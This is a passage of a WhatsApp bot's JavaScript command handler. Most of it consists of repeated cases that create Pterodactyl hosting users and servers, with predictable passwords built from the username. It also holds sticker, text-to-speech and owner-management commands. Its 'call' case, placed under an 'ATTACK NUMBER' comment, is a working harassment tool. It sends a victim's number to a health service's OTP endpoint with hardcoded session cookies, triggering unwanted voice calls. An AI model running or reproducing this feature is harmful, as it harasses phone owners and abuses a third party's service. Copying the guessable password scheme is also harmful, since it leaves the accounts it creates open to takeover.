"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "4gb": {
    if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "50"
let disk = "4040"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await DitzzXploit.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DitzzXploit.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DitzzXploit.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "unli": {
    if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Premium"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await DitzzXploit.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DitzzXploit.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DitzzXploit.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "5gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "500"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await DitzzXploit.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DitzzXploit.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DitzzXploit.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "6gb": {
if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Premium"
let egg = global.eggsnya
let loc = global.location
let memo = "6000"
let cpu = "450"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await DitzzXploit.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DitzzXploit.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DitzzXploit.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "7gb": {
if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Premium"
let egg = global.eggsnya
let loc = global.location
let memo = "7000"
let cpu = "400"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await DitzzXploit.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DitzzXploit.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DitzzXploit.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "8gb": {
if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Premium"
let egg = global.eggsnya
let loc = global.location
let memo = "8000"
let cpu = "450"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await DitzzXploit.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DitzzXploit.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DitzzXploit.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "9gb": {
if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Premium"
let egg = global.eggsnya
let loc = global.location
let memo = "9000"
let cpu = "500"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await DitzzXploit.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
DitzzXploit.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: DitzzXploit.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_19",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
//=================================================//
case "jalantikus":

var reis = await JalanTikusMeme()
teks = ""
teks += "Jalan Tikus Meme\n\n"
teks += `Source: ${reis}`
teks += ""
qio.sendMessage(m.chat, { image : { url : reis }, caption: teks }, { quoted:m })
break
//=================================================
case 'faktaunik':
case 'katabijak':
case 'pantun':
case 'bucin':

var { data } = await axios.get(`https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}`)
reply(data.result)
break
// ATTACK NUMBER
// LAST DI ATAS
case "tts": case "gtts":{
if (!q) return reply(` contoh : ${prefix+command} yamate kudasai`)
reply(mess.wait)
const gtts = require("./all/gtts")(`id`, q)
var bby = args.join(' ')
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
bby.length > 300 ? reply('Teks nya terlalu panjang kak')
: gtts.save(ranm, bby, function () {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buff = fs.readFileSync(rano)
if (err) return reply(mess.error)
DitzzXploit.sendMessage(from, { audio: buff, mimetype: "audio/mp4", ptt: false },{ quoted: m })
fs.unlinkSync(rano)
})
})
}
break
case "sticker": 
case "s": {
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await DitzzXploit.sendStimg(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
let media = await quoted.download()
let encmedia = await DitzzXploit.sendStvid(from, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
}
}
break
case "qc": {
if (!isOwner) return reply(`Khusus Pedia Official Aja`)
if (!quoted){
const getname = await DitzzXploit.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
"url": ppuser
}
},
"text": quotedMsg.chats,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
DitzzXploit.sendStimg(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": ppuser
}
},
"text": q,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
DitzzXploit.sendStimg(from, buffer, m, opt)
});
} else {
reply(`Kirim perintah ${prefix+command} text atau reply pesan dengan perintah ${prefix+command}`)
}
}
break
case "owner": {
const repf = await DitzzXploit.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
DitzzXploit.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Ku Jangan Macam-macam Ya`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break
case "ownsc": {
const repf = await DitzzXploit.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
DitzzXploit.sendMessage(from, { text : `Hai Kak @${sender.split("@")[0]}, Nih Owner Pemilik Sc, Jangan Digalakin!! Kalo Mau Sc Buy Di Owner Ku`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break
case "call":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6285877276864`)
await reply(mess.wait)
let nosend = "+" + q.split("|")[0].replace(/[^0-9]/g, '')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
break
case "addowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285877276864`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await DitzzXploit.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./all/database/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case "delowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285877276864`)
